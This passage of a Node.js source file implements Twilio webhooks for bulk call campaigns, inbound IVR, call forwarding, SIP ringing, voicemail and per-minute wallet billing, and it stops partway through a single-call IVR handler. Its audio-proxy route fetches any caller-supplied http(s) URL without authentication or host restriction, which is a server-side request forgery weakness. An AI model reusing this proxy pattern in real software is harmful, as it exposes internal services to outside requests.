// TWILIO BULK CALL CAMPAIGN — TwiML Webhooks
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


// ── Audio Proxy for Twilio — serves audio with correct Content-Type ──
// CloudFront/EdenAI returns binary/octet-stream which Twilio can't play.
// This proxy streams the audio back with audio/mpeg content type.
// Also handles local files served from /assets/user-audio/ to avoid self-referential requests.
app.get('/twilio/audio-proxy', async (req, res) => {
  const { url } = req.query
  if (!url) return res.status(400).send('Missing url parameter')
  try {
    // ── Validate URL protocol ──
    // Only allow http/https protocols; reject garbled/corrupted URLs
    if (!/^https?:\/\//i.test(url)) {
      log(`[AudioProxy] Rejected invalid URL protocol: ${url.substring(0, 80)}...`)
      return res.status(400).send('Invalid audio URL — only http/https allowed')
    }

    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''

    // Detect local file — avoid HTTP self-request
    const isLocal = url.includes('/assets/user-audio/') || (selfUrl && url.startsWith(selfUrl + '/assets/'))
    if (isLocal) {
      // Extract filename from URL path
      const urlPath = new URL(url).pathname
      const localPath = require('path').join(__dirname, urlPath)
      if (require('fs').existsSync(localPath)) {
        res.set('Content-Type', 'audio/mpeg')
        res.set('Cache-Control', 'public, max-age=3600')
        return require('fs').createReadStream(localPath).pipe(res)
      }
    }

    // External URL — proxy with correct Content-Type
    const axios = require('axios')
    const audioRes = await axios.get(url, {
      responseType: 'stream',
      timeout: 15000,
      headers: { 'Accept': 'audio/mpeg, audio/*' },
    })
    res.set('Content-Type', 'audio/mpeg')
    res.set('Cache-Control', 'public, max-age=3600')
    audioRes.data.pipe(res)
  } catch (e) {
    log(`[AudioProxy] Error fetching audio: ${e.message} | url=${(url || '').substring(0, 120)}`)
    res.status(502).send('Audio fetch failed')
  }
})

// ── Twilio Regulatory Bundle Status Callback ──
app.post('/twilio/bundle-status', async (req, res) => {
  try {
    const { bundleSid, bundleStatus } = req.body || {}
    log(`[BundleWebhook] Received status update: bundle=${bundleSid}, status=${bundleStatus}`)
    if (bundleSid && bundleStatus && pendingBundles?.updateOne) {
      await pendingBundles.updateOne(
        { bundleSid },
        { $set: { status: bundleStatus, updatedAt: new Date() } }
      )
      // Trigger immediate check for this bundle
      setTimeout(() => checkPendingBundles(), 5000)
    }
    res.status(200).json({ received: true })
  } catch (e) {
    log(`[BundleWebhook] Error: ${e.message}`)
    res.status(200).json({ received: true })
  }
})

// TwiML: Initial IVR — play audio + gather DTMF
app.post('/twilio/bulk-ivr', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { campaignId, leadIndex } = req.query
    const response = new VoiceResponse()

    if (!campaignId) {
      response.say('Configuration error. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const campaign = await bulkCallService.getCampaign(campaignId)
    if (!campaign || campaign.status === 'cancelled') {
      response.say('This campaign has been cancelled. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
    const gatherActionUrl = `${selfUrl}/twilio/bulk-ivr-gather?campaignId=${encodeURIComponent(campaignId)}&leadIndex=${leadIndex}`

    // Use audio proxy to serve with correct Content-Type for Twilio
    // Guard: only build proxy URL if campaign has a valid http(s) audioUrl
    const rawAudioUrl = campaign.audioUrl
    const audioUrl = (rawAudioUrl && /^https?:\/\//i.test(rawAudioUrl))
      ? `${selfUrl}/twilio/audio-proxy?url=${encodeURIComponent(rawAudioUrl)}`
      : null

    // Gather DTMF while playing audio
    const gather = response.gather({
      action: gatherActionUrl,
      method: 'POST',
      numDigits: 1,
      timeout: 8,
      finishOnKey: '',
    })
    if (audioUrl) {
      gather.play(audioUrl)
    } else {
      log(`[BulkIVR] ⚠️ No valid audioUrl for campaign=${campaignId}, using TTS fallback | raw=${(rawAudioUrl || 'null').substring(0, 80)}`)
      gather.say('Thank you for your time. Press 1 to continue.')
    }

    // No input — try once more
    const gather2 = response.gather({
      action: gatherActionUrl,
      method: 'POST',
      numDigits: 1,
      timeout: 5,
      finishOnKey: '',
    })
    if (audioUrl) {
      gather2.play(audioUrl)
    } else {
      gather2.say('Press 1 to continue or hang up.')
    }

    // Still no input — hang up
    response.say('No input received. Goodbye.')
    response.hangup()

    log(`[BulkIVR] TwiML served for campaign=${campaignId} lead=${leadIndex}`)
    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[BulkIVR] TwiML error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// TwiML: Gather callback — handle DTMF input
app.post('/twilio/bulk-ivr-gather', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { campaignId, leadIndex } = req.query
    const digits = req.body?.Digits || ''
    const response = new VoiceResponse()

    log(`[BulkIVR] Gather: campaign=${campaignId} lead=${leadIndex} digits=${digits}`)

    const campaign = await bulkCallService.getCampaign(campaignId)
    if (!campaign) {
      response.say('Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // Record the digit pressed
    if (digits) {
      await bulkCallService.onDigitReceived(campaignId, parseInt(leadIndex), digits)
    }

    // Check if it's an active key (e.g., "1")
    if (digits && campaign.activeKeys.includes(digits)) {
      if (campaign.mode === 'transfer' && campaign.transferNumber) {
        // Transfer mode — bridge to the transfer number
        response.say('Please hold while we connect you.')
        const dial = response.dial({
          callerId: campaign.callerId,
          timeout: 30,
        })
        dial.number(campaign.transferNumber)
        log(`[BulkIVR] Transferring lead=${leadIndex} to ${campaign.transferNumber}`)
      } else {
        // Report only — acknowledge and hang up
        response.say('Thank you. Goodbye.')
        response.hangup()
        log(`[BulkIVR] Report-only: lead=${leadIndex} pressed ${digits}`)
      }
    } else {
      // Invalid key or no key
      response.say('Invalid input. Goodbye.')
      response.hangup()
    }

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[BulkIVR] Gather error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// Twilio Bulk Call Status Callback — tracks call completion
app.post('/twilio/bulk-status', async (req, res) => {
  try {
    const { campaignId, leadIndex } = req.query
    const { CallSid, CallStatus, CallDuration, SipResponseCode } = req.body || {}
    const duration = parseInt(CallDuration || '0')

    log(`[BulkIVR] Status: campaign=${campaignId} lead=${leadIndex} sid=${CallSid} status=${CallStatus} duration=${duration}s`)

    if (campaignId && leadIndex != null) {
      const hangupCause = CallStatus === 'failed' ? (SipResponseCode || 'call_failed')
        : CallStatus === 'canceled' ? 'cancelled'
        : null

      await bulkCallService.onCallStatusUpdate(
        CallSid,
        campaignId,
        parseInt(leadIndex),
        CallStatus,
        duration,
        hangupCause
      )
    }

    res.sendStatus(200)
  } catch (error) {
    log('[BulkIVR] Status error:', error.message)
    res.sendStatus(200)
  }
})

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// TWILIO WEBHOOKS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// Twilio Inbound Voice Webhook (PSTN calls to Twilio numbers)
// Enhanced with IVR, voicemail, and call recording (feature parity with Telnyx)
app.post('/twilio/voice-webhook', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { To, From, CallSid } = req.body || {}
    log(`📞 [Twilio] Inbound call: ${From} → ${To} (${CallSid})`)

    // Find the number owner
    const allUsers = await db.collection('phoneNumbersOf').find({}).toArray()
    let owner = null, num = null, ownerNumbers = []
    for (const user of allUsers) {
      const numbers = user.val?.numbers || []
      const match = numbers.find(n => n.phoneNumber === To && n.provider === 'twilio' && n.status === 'active')
      if (match) { owner = user._id; num = match; ownerNumbers = numbers; break }
    }

    const response = new VoiceResponse()

    if (!num || !owner) {
      response.say('This number is not currently active.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const chatId = owner
    const fwdConfig = num.features?.callForwarding
    const vmConfig = num.features?.voicemail
    const recordingEnabled = num.features?.recording === true
    const hasSip = !!num.sipUsername
    const SIP_DOMAIN = process.env.SIP_DOMAIN || 'sip.speechcue.com'

    // Check minute limit — pool across parent + sub-numbers
    const minuteLimit = getPoolMinuteLimit(ownerNumbers, num)
    const poolMinutesUsed = getPoolMinutesUsed(ownerNumbers, num)
    if (minuteLimit !== Infinity && poolMinutesUsed >= minuteLimit) {
      // Plan exhausted — check wallet for overage (same pattern as Telnyx inbound)
      try {
        const { usdBal } = await getBalance(walletOf, chatId)
        const isUSCA = (From || '').replace(/[^+\d]/g, '').startsWith('+1')
        const rate = isUSCA ? parseFloat(process.env.OVERAGE_RATE_MIN || '0.04') : parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
        if (usdBal >= rate) {
          // Wallet has balance — allow call with overage
          log(`[Twilio] Plan exhausted (${poolMinutesUsed}/${minuteLimit}), wallet $${usdBal.toFixed(2)} — allowing overage at $${rate}/min`)
          bot?.sendMessage(chatId, `⚠️ <b>Plan Minutes Exhausted</b>\nCall from ${phoneConfig.formatPhone(From)} allowed via wallet overage ($${rate}/min ${isUSCA ? 'US/CA' : 'Intl'}).\nWallet: $${usdBal.toFixed(2)}`, { parse_mode: 'HTML' }).catch(() => {})
          // Fall through to normal call handling below
        } else {
          // No wallet balance — block call
          response.say('This number has reached its monthly minute limit and wallet is empty. Please top up.')
          response.hangup()
          bot?.sendMessage(chatId, `🚫 <b>Incoming Call Blocked — No Credits</b>\n📞 ${phoneConfig.formatPhone(From)} → ${phoneConfig.formatPhone(To)}\n\nPlan: ${poolMinutesUsed}/${minuteLimit} min used\nWallet: $${usdBal.toFixed(2)} (need $${rate}/min)\n\nTop up via 👛 Wallet or upgrade your plan.`, { parse_mode: 'HTML' }).catch(() => {})
          return res.type('text/xml').send(response.toString())
        }
      } catch (e) {
        log(`[Twilio] Wallet check error on limit block: ${e.message}`)
        response.say('This number has reached its monthly minute limit.')
        response.hangup()
        bot?.sendMessage(chatId, `🚫 <b>Call Blocked</b> — Minute limit reached (${poolMinutesUsed}/${minuteLimit} min).\nUpgrade your plan for more minutes.`, { parse_mode: 'HTML' }).catch(() => {})
        return res.type('text/xml').send(response.toString())
      }
    }

    // ━━━ PRIORITY 0: IVR Auto-Attendant (Business plan) ━━━
    const ivrConfig = num.features?.ivr
    if (ivrConfig?.enabled && phoneConfig.canAccessFeature(num.plan, 'ivr') && ivrConfig.options && Object.keys(ivrConfig.options).length > 0) {
      log(`[Twilio] Starting IVR auto-attendant for ${To}`)
      const ivrGatherUrl = `${SELF_URL}/twilio/inbound-ivr-gather?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`
      const gather = response.gather({ action: ivrGatherUrl, method: 'POST', numDigits: 1, timeout: 10, finishOnKey: '' })
      if (ivrConfig.greetingAudioUrl) {
        gather.play(ivrConfig.greetingAudioUrl)
      } else if (ivrConfig.greeting) {
        gather.say(ivrConfig.greeting)
      } else {
        gather.say('Thank you for calling. Please listen to the following options.')
      }
      // Repeat once for callers who missed it
      const gather2 = response.gather({ action: ivrGatherUrl, method: 'POST', numDigits: 1, timeout: 8, finishOnKey: '' })
      gather2.say('Sorry, we did not receive your selection. Please try again.')
      // No selection — fall to voicemail or hangup
      if (vmConfig?.enabled) {
        if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
          response.play(vmConfig.customAudioGreetingUrl)
        } else { response.say('No selection received. Please leave a message after the beep.') }
        response.record({ action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`, maxLength: 120, playBeep: true, timeout: 5 })
      } else {
        response.say('No selection received. Goodbye.')
        response.hangup()
      }
      bot?.sendMessage(chatId, `📞 <b>Incoming Call</b>\nFrom: ${phoneConfig.formatPhone(From)} → ${phoneConfig.formatPhone(To)}\n🤖 IVR Auto-Attendant active`, { parse_mode: 'HTML' }).catch(() => {})
      return res.type('text/xml').send(response.toString())
    }

    // ━━━ PRIORITY 1: Forward-always ━━━
    if (fwdConfig?.enabled && fwdConfig.forwardTo && fwdConfig.mode === 'always') {
      const RATE = parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
      const { usdBal } = await getBalance(walletOf, chatId)
      if (usdBal < RATE) {
        if (vmConfig?.enabled) {
          bot?.sendMessage(chatId, `🚫 <b>Call Forwarding Blocked</b> — Wallet $${usdBal.toFixed(2)} (need $${RATE}/min). Sending to voicemail.`, { parse_mode: 'HTML' }).catch(() => {})
        } else {
          response.say('Your wallet balance is insufficient for call forwarding. Please try again later.')
          response.hangup()
          bot?.sendMessage(chatId, `🚫 <b>Call Forwarding Blocked</b> — Wallet $${usdBal.toFixed(2)} (need $${RATE}/min).\nTop up via Wallet.`, { parse_mode: 'HTML' }).catch(() => {})
          return res.type('text/xml').send(response.toString())
        }
      } else {
        const ringTimeout = fwdConfig.ringTimeout || 25
        // ── Real-time billing: compute timeLimit for forwarding (wallet-only) ──
        const fwdTimeLimit = computeDialTimeLimit('forwarding', { walletBalance: usdBal, ratePerMinute: RATE })
        log(`[Twilio] Forward-always dial timeLimit: ${fwdTimeLimit}s (wallet=$${usdBal.toFixed(2)}, rate=$${RATE}/min)`)
        const dialOpts = {
          callerId: To,
          timeout: ringTimeout,
          timeLimit: fwdTimeLimit,
          action: `${SELF_URL}/twilio/voice-dial-status?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`
        }
        if (recordingEnabled) dialOpts.record = 'record-from-answer-dual'
        if (recordingEnabled) dialOpts.recordingStatusCallback = `${SELF_URL}/twilio/recording-status`
        const dial = response.dial(dialOpts)
        dial.number(fwdConfig.forwardTo)
        bot?.sendMessage(chatId, `📞 <b>Incoming Call</b>\nFrom: ${From}\nForwarding to: ${fwdConfig.forwardTo}`, { parse_mode: 'HTML' }).catch(() => {})
        return res.type('text/xml').send(response.toString())
      }
    }

    // ━━━ PRIORITY 2: Ring SIP device via sip.speechcue.com ━━━
    if (hasSip) {
      const ringTimeout = fwdConfig?.ringTimeout || 25
      // Use Telnyx credential (gencred...) for SIP routing since sip.speechcue.com → sip.telnyx.com
      const sipUser = num.telnyxSipUsername || num.sipUsername
      const sipUri = `sip:${sipUser}@${SIP_DOMAIN}`

      // ── Real-time billing: compute timeLimit based on plan minutes + wallet overage ──
      const isUSCA_sip = (From || '').replace(/[^+\d]/g, '').startsWith('+1')
      const overageRate_sip = isUSCA_sip ? parseFloat(process.env.OVERAGE_RATE_MIN || '0.04') : parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
      const { usdBal: sipWalletBal } = await getBalance(walletOf, chatId)
      const planRemaining_sip = minuteLimit === Infinity ? 240 : Math.max(0, minuteLimit - poolMinutesUsed)
      const sipTimeLimit = computeDialTimeLimit('inbound', { planMinutesRemaining: planRemaining_sip, walletBalance: sipWalletBal, ratePerMinute: overageRate_sip })
      log(`[Twilio] SIP dial timeLimit: ${sipTimeLimit}s (planRemaining=${planRemaining_sip}min, wallet=$${sipWalletBal.toFixed(2)}, rate=$${overageRate_sip}/min)`)

      const dialOpts = {
        callerId: From,
        timeout: ringTimeout,
        timeLimit: sipTimeLimit,
        action: `${SELF_URL}/twilio/sip-ring-result?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`
      }
      if (recordingEnabled) {
        dialOpts.record = 'record-from-answer-dual'
        dialOpts.recordingStatusCallback = `${SELF_URL}/twilio/recording-status`
      }
      const dial = response.dial(dialOpts)
      dial.sip(sipUri)
      bot?.sendMessage(chatId, `📞 <b>Incoming Call</b>\nFrom: ${From} → ${To}\n📱 Ringing your SIP device...`, { parse_mode: 'HTML' }).catch(() => {})
      return res.type('text/xml').send(response.toString())
    }

    // ━━━ PRIORITY 3: Call Forwarding (no-answer mode without SIP) ━━━
    if (fwdConfig?.enabled && fwdConfig.forwardTo) {
      const RATE = parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
      const { usdBal } = await getBalance(walletOf, chatId)
      if (usdBal >= RATE) {
        const ringTimeout = fwdConfig.ringTimeout || 25
        // ── Real-time billing: compute timeLimit for forwarding (wallet-only) ──
        const fwdNaTimeLimit = computeDialTimeLimit('forwarding', { walletBalance: usdBal, ratePerMinute: RATE })
        log(`[Twilio] Forward-no-answer dial timeLimit: ${fwdNaTimeLimit}s (wallet=$${usdBal.toFixed(2)}, rate=$${RATE}/min)`)
        const dialOpts = {
          callerId: To,
          timeout: ringTimeout,
          timeLimit: fwdNaTimeLimit,
          action: `${SELF_URL}/twilio/voice-dial-status?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`
        }
        if (recordingEnabled) dialOpts.record = 'record-from-answer-dual'
        if (recordingEnabled) dialOpts.recordingStatusCallback = `${SELF_URL}/twilio/recording-status`
        const dial = response.dial(dialOpts)
        dial.number(fwdConfig.forwardTo)
        bot?.sendMessage(chatId, `📞 <b>Incoming Call</b>\nFrom: ${From}\nForwarding to: ${fwdConfig.forwardTo}`, { parse_mode: 'HTML' }).catch(() => {})
        return res.type('text/xml').send(response.toString())
      } else if (!vmConfig?.enabled) {
        response.say('Your wallet balance is insufficient for call forwarding. Please try again later.')
        response.hangup()
        bot?.sendMessage(chatId, `🚫 <b>Call Forwarding Blocked</b> — Wallet $${usdBal.toFixed(2)} (need $${RATE}/min).\nTop up via Wallet.`, { parse_mode: 'HTML' }).catch(() => {})
        return res.type('text/xml').send(response.toString())
      }
    }

    // ━━━ PRIORITY 4: Voicemail ━━━
    if (vmConfig?.enabled) {
      if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
        response.play(vmConfig.customAudioGreetingUrl)
      } else if (vmConfig.greetingType === 'custom' && vmConfig.customGreetingText) {
        response.say(vmConfig.customGreetingText)
      } else {
        response.say('The person you are calling is unavailable. Please leave a message after the beep.')
      }
      response.record({
        maxLength: 120,
        action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(From)}&to=${encodeURIComponent(To)}`,
        transcribe: false,
        playBeep: true,
        timeout: 5
      })
      response.say('No message recorded. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // No forwarding and no voicemail — just notify
    response.say('The person you are calling is unavailable. Please try again later.')
    response.hangup()
    bot?.sendMessage(chatId, `📞 <b>Missed Call</b>\nFrom: ${From}\nTo: ${To}`, { parse_mode: 'HTML' }).catch(() => {})

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[Twilio] Voice webhook error:', error.message)
    const VR = new VoiceResponse()
    VR.say('An error occurred. Please try again.')
    VR.hangup()
    res.type('text/xml').send(VR.toString())
  }
})

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Twilio SIP Ring Result — fallback when SIP device doesn't answer
// Priority: Forward-no-answer > Voicemail > Missed notification
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ── Dedup set: track Twilio CallSids already billed in action handlers (sip-ring-result / voice-dial-status)
// voice-status callback fires AFTER these and must skip billing if already handled
const _twilioBilledCallSids = new Set()
// Auto-cleanup: remove stale entries every 30 min (calls older than 2h can't re-trigger)
setInterval(() => _twilioBilledCallSids.clear(), 30 * 60 * 1000)

// ── Dedup set already declared above ──

// ━━━ Twilio Inbound IVR Gather Result ━━━
app.post('/twilio/inbound-ivr-gather', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { chatId: rawChatId, from, to } = req.query
    const chatId = rawChatId ? parseInt(rawChatId) : null
    const { Digits } = req.body || {}
    const response = new VoiceResponse()
    const decodedFrom = decodeURIComponent(from || 'unknown')
    const decodedTo = decodeURIComponent(to || '')

    log(`[Twilio] IVR gather: chatId=${chatId} digits=${Digits} from=${decodedFrom} to=${decodedTo}`)

    if (!chatId || !Digits) {
      response.say('Invalid selection. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // Look up user's IVR config
    const allUsers = await db.collection('phoneNumbersOf').find({}).toArray()
    let num = null
    for (const user of allUsers) {
      const numbers = user.val?.numbers || []
      const match = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
      if (match && user._id === chatId) { num = match; break }
    }

    const ivrConfig = num?.features?.ivr || {}
    const option = ivrConfig.options?.[Digits]

    if (!option) {
      response.say('Invalid selection. Goodbye.')
      response.hangup()
      bot?.sendMessage(chatId, `📞 <b>IVR Call</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n❌ Invalid key pressed: ${Digits}`, { parse_mode: 'HTML' }).catch(() => {})
      return res.type('text/xml').send(response.toString())
    }

    // Handle IVR option actions
    const action = option.action || 'transfer'
    const label = option.label || `Option ${Digits}`

    if (action === 'transfer' && option.number) {
      response.say(`Connecting you to ${label}. Please hold.`)
      const dial = response.dial({ callerId: decodedTo, timeout: 30 })
      dial.number(option.number)
      log(`[Twilio] IVR transferring to ${option.number} (key ${Digits}: ${label})`)
      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n🔗 Transferring to: ${option.number}\n📋 ${label}`, { parse_mode: 'HTML' }).catch(() => {})
    } else if (action === 'voicemail') {
      const vmConfig = num?.features?.voicemail || {}
      if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
        response.play(vmConfig.customAudioGreetingUrl)
      } else { response.say(option.message || 'Please leave a message after the beep.') }
      response.record({
        action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(decodedFrom)}&to=${encodeURIComponent(decodedTo)}`,
        maxLength: 120, playBeep: true, timeout: 5,
      })
      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label} → Voicemail`, { parse_mode: 'HTML' }).catch(() => {})
    } else if (action === 'message') {
      response.say(option.message || 'Thank you for calling. Goodbye.')
      response.hangup()
      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label} → Message played`, { parse_mode: 'HTML' }).catch(() => {})
    } else {
      response.say('Thank you. Goodbye.')
      response.hangup()
      bot?.sendMessage(chatId, `📞 <b>IVR Call — Key ${Digits}</b>\nFrom: ${phoneConfig.formatPhone(decodedFrom)}\n📋 ${label}`, { parse_mode: 'HTML' }).catch(() => {})
    }

    // Log IVR interaction
    await db.collection('phoneLogs').insertOne({
      chatId, type: 'ivr_inbound', provider: 'twilio',
      from: decodedFrom, to: decodedTo, digitPressed: Digits,
      action, label, timestamp: new Date().toISOString(),
    })

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[Twilio] IVR gather error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

app.post('/twilio/sip-ring-result', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { chatId: rawChatId, from, to } = req.query
    const chatId = rawChatId ? parseInt(rawChatId) : null
    const { DialCallStatus, DialCallDuration, CallSid } = req.body || {}
    const response = new VoiceResponse()
    const decodedFrom = decodeURIComponent(from || 'unknown')
    const decodedTo = decodeURIComponent(to || '')

    log(`[Twilio] SIP ring result: ${decodedFrom} → ${decodedTo} status=${DialCallStatus} duration=${DialCallDuration || 0}s sid=${CallSid || '?'}`)

    // Call connected and completed via SIP — bill inbound minutes
    if (DialCallStatus === 'completed') {
      const duration = parseInt(DialCallDuration || '0')
      const minutes = duration > 0 ? Math.ceil(duration / 60) : 0
      if (minutes > 0 && chatId && decodedTo) {
        try {
          const voiceService = require('./voice-service.js')
          const userData = await get(phoneNumbersOf, chatId)
          const numbers = userData?.numbers || []
          const num = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
          if (num) {
            const billingInfo = await voiceService.billCallMinutesUnified(chatId, num.phoneNumber, minutes, decodedFrom, 'Twilio_Inbound')
            const remaining = billingInfo.limit > 0 ? Math.max(0, billingInfo.limit - billingInfo.used) : null
            const planLine = remaining !== null
              ? `${minutes} min · <b>${remaining}/${billingInfo.limit}</b> remaining`
              : `${minutes} min`
            const overageLine = billingInfo.overageCharge > 0
              ? `\n💰 Overage: $${billingInfo.overageCharge.toFixed(2)} from wallet`
              : ''
            log(`[Twilio] SIP inbound billed: ${minutes} min (${billingInfo.planMinUsed} plan + ${billingInfo.overageMin} overage)`)
            // Mark this CallSid as already billed — voice-status must skip it
            if (CallSid) _twilioBilledCallSids.add(CallSid)
            bot?.sendMessage(chatId, `📞 <b>SIP Call Ended</b>\n📲 ${phoneConfig.formatPhone(decodedFrom)}\n⏱️ ${planLine}${overageLine}`, { parse_mode: 'HTML' }).catch(() => {})
          } else {
            log(`[Twilio] SIP ring billing skipped — number ${decodedTo} not found for chatId=${chatId}`)
          }
        } catch (e) { log(`[Twilio] SIP ring billing error: ${e.message}`) }
      }
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // SIP ring failed (no-answer/busy/failed) — fallback chain
    const allUsers = await db.collection('phoneNumbersOf').find({}).toArray()
    let ownerData = null, num = null
    for (const user of allUsers) {
      const numbers = user.val?.numbers || []
      const match = numbers.find(n => n.phoneNumber === decodedTo && n.status === 'active')
      if (match) { ownerData = user; num = match; break }
    }

    if (!num) {
      response.say('An error occurred.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const fwdConfig = num.features?.callForwarding
    const vmConfig = num.features?.voicemail
    const recordingEnabled = num.features?.recording === true

    const reason = DialCallStatus === 'no-answer' ? 'No answer'
      : DialCallStatus === 'busy' ? 'Busy'
      : DialCallStatus === 'failed' ? 'Call failed'
      : DialCallStatus || 'No response'
    bot?.sendMessage(Number(chatId), `📱 <b>SIP Ring — ${reason}</b>\nFrom: ${decodedFrom} → ${decodedTo}`, { parse_mode: 'HTML' }).catch(() => {})

    // Fallback 1: Forward (no_answer mode)
    if (fwdConfig?.enabled && fwdConfig.forwardTo && fwdConfig.mode !== 'always') {
      const RATE = parseFloat(process.env.CALL_FORWARDING_RATE_MIN || '0.50')
      const { usdBal } = await getBalance(walletOf, Number(chatId))
      if (usdBal >= RATE) {
        const dialOpts = {
          callerId: decodedTo,
          timeout: 30,
          action: `${SELF_URL}/twilio/voice-dial-status?chatId=${chatId}&from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`
        }
        if (recordingEnabled) {
          dialOpts.record = 'record-from-answer-dual'
          dialOpts.recordingStatusCallback = `${SELF_URL}/twilio/recording-status`
        }
        const dial = response.dial(dialOpts)
        dial.number(fwdConfig.forwardTo)
        bot?.sendMessage(Number(chatId), `📞 Forwarding to ${fwdConfig.forwardTo}...`, { parse_mode: 'HTML' }).catch(() => {})
        return res.type('text/xml').send(response.toString())
      }
    }

    // Fallback 2: Voicemail
    if (vmConfig?.enabled) {
      if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
        response.play(vmConfig.customAudioGreetingUrl)
      } else if (vmConfig.greetingType === 'custom' && vmConfig.customGreetingText) {
        response.say(vmConfig.customGreetingText)
      } else {
        response.say('The person you are calling is unavailable. Please leave a message after the beep.')
      }
      response.record({
        maxLength: 120,
        action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(from || '')}&to=${encodeURIComponent(to || '')}`,
        transcribe: false,
        playBeep: true,
        timeout: 5
      })
      response.say('No message recorded. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // Fallback 3: Missed call
    response.say('The person you are calling is unavailable. Please try again later.')
    response.hangup()
    bot?.sendMessage(Number(chatId), `📞 <b>Missed Call</b>\nFrom: ${decodedFrom}\nTo: ${decodedTo}\n(SIP device didn't answer, no forwarding/voicemail configured)`, { parse_mode: 'HTML' }).catch(() => {})

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[Twilio] SIP ring result error:', error.message)
    const VR = new VoiceResponse()
    VR.say('An error occurred.')
    VR.hangup()
    res.type('text/xml').send(VR.toString())
  }
})

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// SINGLE IVR OUTBOUND VIA TWILIO — TwiML Endpoints
// Parallel to bulk-ivr but for individual bot-triggered IVR calls on Twilio numbers
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// TwiML: Play audio + gather DTMF
app.post('/twilio/single-ivr', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { sessionId } = req.query
    const response = new VoiceResponse()
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    if (!session) {
      response.say('Configuration error. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    session.phase = 'playing'
    const gatherUrl = `${SELF_URL}/twilio/single-ivr-gather?sessionId=${encodeURIComponent(sessionId)}`
    const twilioVoice = voiceService.getTwilioVoice(session.voiceName)

    // Use audio proxy to serve with correct Content-Type for Twilio
    // Guard: only build proxy URL if session has a valid http(s) audioUrl
    const rawAudioUrl = session.audioUrl
    const audioProxyUrl = (rawAudioUrl && /^https?:\/\//i.test(rawAudioUrl))
      ? `${SELF_URL}/twilio/audio-proxy?url=${encodeURIComponent(rawAudioUrl)}`
      : null
    if (!audioProxyUrl && rawAudioUrl) {
      log(`[SingleIVR] ⚠️ Invalid audioUrl protocol for session=${sessionId}: ${(rawAudioUrl || '').substring(0, 80)}`)
    }

    // First attempt: play audio and gather
